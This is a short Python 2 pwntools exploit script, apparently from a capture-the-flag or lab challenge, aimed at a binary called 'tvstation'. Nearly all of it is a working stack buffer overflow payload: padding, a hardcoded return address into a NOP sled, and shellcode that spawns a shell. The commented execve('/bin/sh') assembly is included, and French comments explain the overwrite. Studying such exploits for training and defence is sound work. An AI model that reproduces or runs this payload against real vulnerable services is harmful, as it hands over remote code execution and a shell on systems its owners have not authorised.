from pwn import *


context(os="linux", arch="i386")

# >>> print shellcraft.sh()
#
#     /* push '/bin///sh\x00' */
#     push 0x68
#     push 0x732f2f2f
#     push 0x6e69622f
#
#     /* call execve('esp', 0, 0) */
#     mov ebx, esp
#     xor ecx, ecx
#     push 0xb
#     pop eax
#     cdq /* Set edx to 0, eax is known to be positive */
#     int 0x80
shellcode = asm(shellcraft.dupsh())

# p = process("./bin/tvstation")
# # p = remote("localhost", 4444)
# # p = remote("192.168.0.153", 4444)
# gdb.attach(p, """
# b debug_func
# """)

# p.sendline("4")
print 4
# data = p.recv()

payload = "A" * 32 # Padding jusqu'a l'adresse de retour
payload += p32(0xffffd250) # Ecraser adresse de retour par adresse des NOP
payload += "\x90" * (0xc8 - 32 - 4 - 1 - len(shellcode))
payload += shellcode
print payload

# p.sendline(payload)
# p.interactive()
